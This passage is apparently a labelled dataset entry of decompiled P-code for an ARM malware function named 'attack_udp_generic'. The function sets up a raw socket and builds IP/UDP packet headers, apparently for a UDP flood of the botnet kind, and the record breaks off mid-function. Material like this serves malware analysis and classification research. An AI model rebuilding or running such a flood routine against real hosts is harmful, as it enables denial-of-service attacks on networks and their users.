Label: 857
Function: attack_udp_generic
Architecture: arm
Source File: Unknown
Entry Point: 00018938

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x1000021e, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x3d, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x110, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x110, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x110, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (unique, 0x70f00, 2) , (const, 0x110, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x110, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x110, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x110, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x110, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x110, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x110, 4)
(unique, 0x70f00, 2) SUBPIECE (register, 0x20, 4) , (const, 0x0, 4)
(register, 0x20, 4) CALL (ram, 0x16a74, 8) , (register, 0x28, 1) , (register, 0x2c, 4) , (const, 0x1, 1) , (const, 0x1, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x133, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x133, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x133, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x133, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x133, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x133, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x133, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x133, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x133, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x133, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x133, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x133, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x133, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (unique, 0x70f00, 2) , (const, 0x133, 4)
(unique, 0x70d00, 1) SUBPIECE (register, 0x20, 4) , (const, 0x0, 4)
(register, 0x2c, 4) LOAD (const, 0x1a1, 4) , (ram, 0x18f58, 4)
(register, 0x20, 4) CALL (ram, 0x16a74, 8) , (register, 0x28, 1) , (register, 0x2c, 4) , (const, 0x19, 1) , (register, 0x2c, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x14d, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x14d, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x14d, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x14d, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x14d, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x14d, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (unique, 0x70d00, 1) , (const, 0x14d, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x14d, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x14d, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x14d, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x14d, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x14d, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x14d, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x14d, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x14d, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffee, 2)
(unique, 0x2080, 1) INT_LESS (ram, 0x18f5c, 4) , (register, 0x2c, 4)
 ---  CBRANCH (ram, 0x18a8c, 1) , (unique, 0x2080, 1)
(unique, 0x70f00, 2) SUBPIECE (ram, 0x18f5c, 4) , (const, 0x0, 4)
(stack, 0xffffffffffffffee, 2) MULTIEQUAL (stack, 0xffffffffffffffee, 2) , (unique, 0x70f00, 2)
(register, 0x20, 4) CALL (ram, 0x2bbc0, 8) , (const, 0x2, 4) , (const, 0x3, 4) , (const, 0x11, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x18b, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x18b, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x18b, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x18b, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x18b, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x18b, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (register, 0x20, 4) , (const, 0x18b, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x18b, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x18b, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x18b, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x18b, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x18b, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x18b, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x18b, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x18b, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x18b, 4)
(register, 0x65, 1) INT_NOTEQUAL (register, 0x20, 4) , (const, 0xffffffff, 4)
 ---  CBRANCH (ram, 0x18f48, 1) , (register, 0x65, 1)
(stack, 0xffffffffffffffb8, 4) COPY (const, 0x1, 4)
(register, 0x2c, 4) PTRSUB (register, 0x54, 4) , (const, 0xffffffb8, 4)
(register, 0x20, 4) CALL (ram, 0x2bb70, 8) , (register, 0x20, 4) , (const, 0x0, 4) , (const, 0x3, 4) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x1e4, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x1e4, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x1e4, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x1e4, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x1e4, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x1e4, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x1e4, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (register, 0x20, 4) , (const, 0x1e4, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x1e4, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x1e4, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x1e4, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x1e4, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x1e4, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x1e4, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x1e4, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x1e4, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x1e4, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x1e4, 4)
(register, 0x65, 1) INT_NOTEQUAL (register, 0x20, 4) , (const, 0xffffffff, 4)
 ---  CBRANCH (ram, 0x18ae8, 1) , (register, 0x65, 1)
 ---  CALL (ram, 0x2991c, 8) , (stack, 0xffffffffffffffd4, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x1fb, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x1fb, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x1fb, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x1fb, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x1fb, 4)
 ---  BRANCH (ram, 0x18f4c, 1)
(stack, 0xffffffffffffffb8, 4) COPY (const, 0x0, 4)
 ---  BRANCH (ram, 0x18c98, 1)
(register, 0x30, 4) PTRADD (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffb8, 4) , (const, 0x4, 4)
(unique, 0x10000226, 4) CALL (ram, 0x26a60, 8) , (ram, 0x18f60, 4) , (const, 0x1, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x51b, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x51b, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x51b, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x51b, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x51b, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x51b, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x51b, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x51b, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x51b, 4)
(stack, 0xffffffffffffffdd, 1) INDIRECT (stack, 0xffffffffffffffdd, 1) , (const, 0x51b, 4)
(stack, 0xffffffffffffffde, 2) INDIRECT (stack, 0xffffffffffffffde, 2) , (const, 0x51b, 4)
(stack, 0xffffffffffffffe0, 2) INDIRECT (stack, 0xffffffffffffffe0, 2) , (const, 0x51b, 4)
(stack, 0xffffffffffffffe2, 1) INDIRECT (stack, 0xffffffffffffffe2, 1) , (const, 0x51b, 4)
(stack, 0xffffffffffffffe3, 1) INDIRECT (stack, 0xffffffffffffffe3, 1) , (const, 0x51b, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x51b, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x51b, 4)
(stack, 0xffffffffffffffe8, 4) INDIRECT (stack, 0xffffffffffffffe8, 4) , (const, 0x51b, 4)
(stack, 0xffffffffffffffee, 2) INDIRECT (stack, 0xffffffffffffffee, 2) , (const, 0x51b, 4)
(register, 0x20, 4) CAST (unique, 0x10000226, 4)
 ---  STORE (const, 0x1a1, 4) , (register, 0x30, 4) , (register, 0x20, 4)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x51e, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x51e, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x51e, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x51e, 4)
(register, 0x2c, 4) PTRADD (stack, 0xffffffffffffffe8, 4) , (stack, 0xffffffffffffffb8, 4) , (const, 0x4, 4)
(unique, 0x1000022a, 4) LOAD (const, 0x1a1, 4) , (register, 0x2c, 4)
(register, 0x2c, 4) CAST (unique, 0x1000022a, 4)
(unique, 0x1000022e, 4) PTRADD (register, 0x2c, 4) , (const, 0x1, 4) , (const, 0x14, 4)
(register, 0x2c, 4) CAST (unique, 0x1000022e, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x10000232, 4)
(unique, 0x10000232, 4) CAST (register, 0x2c, 4)
(register, 0x2c, 1) INT_AND (unique, 0x43980, 1) , (const, 0x4f, 1)
(register, 0x2c, 1) INT_OR (register, 0x2c, 1) , (const, 0x40, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x10000236, 4) , (register, 0x2c, 1)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x567, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x567, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x567, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x567, 4)
(unique, 0x10000236, 4) CAST (register, 0x2c, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x1000023a, 4)
(unique, 0x1000023a, 4) CAST (register, 0x2c, 4)
(register, 0x2c, 1) INT_AND (unique, 0x43980, 1) , (const, 0xf5, 1)
(register, 0x2c, 1) INT_OR (register, 0x2c, 1) , (const, 0x5, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x1000023e, 4) , (register, 0x2c, 1)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x588, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x588, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x588, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x588, 4)
(unique, 0x1000023e, 4) CAST (register, 0x2c, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (stack, 0xffffffffffffffe7, 1)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x590, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x590, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x590, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x590, 4)
(unique, 0x8280, 4) PTRSUB (register, 0x2c, 4) , (const, 0x1, 4)
(register, 0x2c, 2) INT_ADD (stack, 0xffffffffffffffee, 2) , (const, 0x1c, 2)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (register, 0x2c, 2)
(ram, 0x18f54, 4) INDIRECT (ram, 0x18f54, 4) , (const, 0x5b6, 4)
(ram, 0x18f58, 4) INDIRECT (ram, 0x18f58, 4) , (const, 0x5b6, 4)
(ram, 0x18f5c, 4) INDIRECT (ram, 0x18f5c, 4) , (const, 0x5b6, 4)
(ram, 0x18f60, 4) INDIRECT (ram, 0x18f60, 4) , (const, 0x5b6, 4)
